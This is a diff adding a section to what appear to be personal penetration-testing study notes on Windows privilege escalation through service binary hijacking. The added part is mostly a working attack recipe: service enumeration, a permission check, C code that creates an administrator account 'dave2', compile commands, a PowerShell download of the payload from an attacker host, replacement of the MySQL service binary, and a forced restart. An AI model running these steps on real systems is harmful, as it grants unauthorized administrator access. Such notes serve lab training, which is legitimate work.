@@ -20,6 +20,66 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
 
 Get-Process
 
+
+SERVICE BINARY HIJACKING
+
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} -- Look for any files running out of directories that you have write privs.
+
+icacls "<juicyservicebinarypathhere>" -- You want write privs.
+
+If you have full access replace .exe with malicious.exe
+
+For ex use the following exploit written in C.
+
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe -- then compile
+
+Then grab the exe and move it into the .exe
+
+PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  
+
+PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+
+PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+Attempt to stop and the start service.
+
+net stop mysql
+
+net start mysql
+
+If this doesn't work, look at how service starts via this cmd.
+
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
+Try restarting machine.
+
+shutdown /r /t 0
+
+
+
+
+DLL HIJACKING
+
+
+
+
+
+
+
+
+
 MISC
 
 1. Finds keepass files.
